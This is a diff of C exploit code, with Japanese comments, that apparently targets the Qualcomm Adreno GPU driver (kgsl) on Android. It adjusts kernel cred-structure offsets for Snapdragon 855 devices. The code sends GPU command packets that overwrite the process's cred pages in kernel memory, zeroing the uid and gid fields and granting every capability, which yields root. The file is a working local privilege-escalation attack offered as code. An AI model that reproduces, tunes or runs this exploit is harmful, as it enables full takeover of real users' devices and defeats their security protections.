@@ -624,7 +624,7 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8b: Direct cred overwrite (修正版) =====
+    // ===== Phase 8b: Direct cred overwrite (Snapdragon 855 オフセット修正版) =====
     if (n_cred > 0) {
         printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
@@ -634,7 +634,7 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
-            // Read BEFORE (uid は cbase+0x0c から)
+            // Read BEFORE (uid は cbase+0x10)
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
@@ -652,9 +652,9 @@ int main(int argc, char **argv) {
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t *bd = (uint32_t *)dst_m;
-            // uid は offset 0x0c なので bd[3]
+            // uid は offset 0x10 → bd[4]
             printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-                p, bd[31], bd[30], bd[3]);
+                p, bd[31], bd[30], bd[4]);
 
             n_ok++;
 
@@ -668,43 +668,41 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // ===== 修正: 正しいオフセットで書き込む (Snapdragon 855 レイアウト) =====
-            // オフセット 0x0c から 19 ワード (76バイト):
-            //   8 ワード: uid から fsgid まで (0x0c ~ 0x2b) → 0
-            //   1 ワード: securebits (0x2c) → 0x00000004
-            //  10 ワード: 5 つの Capability (各 2 ワード)
-            //       CapInh     (0x30 ~ 0x37)
-            //       CapPrm     (0x38 ~ 0x3f)
-            //       CapEff     (0x40 ~ 0x47)
-            //       CapBset    (0x48 ~ 0x4f)
-            //       CapAmbient (0x50 ~ 0x57)
+            // 書き込み: オフセット 0x10 から 19 ワード
+            //   uid～fsgid (8ワード) を 0
+            //   securebits (0x30) = 0x00000004
+            //   CapInh (0x34-0x37) = 0x00000003ffffffff
+            //   CapPrm (0x3c-0x3f) = 0x00000003ffffffff
+            //   CapEff (0x44-0x47) = 0x00000003ffffffff
+            //   CapBset (0x4c-0x4f) = 0x00000003ffffffff
+            //   CapAmbient (0x54-0x57) = 0x00000003ffffffff
             memset(ib_m, 0, 0x10000);
             dw = 0;
-            split64(cbase + 0x0c, &zl, &zh);
+            split64(cbase + 0x10, &zl, &zh);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);
             cmd[dw++] = zl; cmd[dw++] = zh;
 
             // 8 ワードの 0 (uid～fsgid)
             for (int i = 0; i < 8; i++) cmd[dw++] = 0;
 
-            // securebits (0x2c)
+            // securebits (0x30)
             cmd[dw++] = 0x00000004;
 
-            // CapInh (0x30-0x37) = 0x00000003ffffffff
+            // CapInh (0x34)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapPrm (0x38-0x3f)
+            // CapPrm (0x3c)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapEff (0x40-0x47)
+            // CapEff (0x44)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapBset (0x48-0x4f)
+            // CapBset (0x4c)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapAmbient (0x50-0x57)
+            // CapAmbient (0x54)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
 
-            // Readback uid (cbase+0x0c)
+            // Readback uid (cbase+0x10)
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
-            split64(cbase + 0x0c, &sl, &sh);
+            split64(cbase + 0x10, &sl, &sh);
             cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
             cmd[dw++] = sl; cmd[dw++] = sh;
@@ -750,7 +748,7 @@ int main(int argc, char **argv) {
                 }
                 printf("\n");
                 printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
-                    cd[31], cd[30], cd[3]);
+                    cd[31], cd[30], cd[4]);
             }
         }
     }
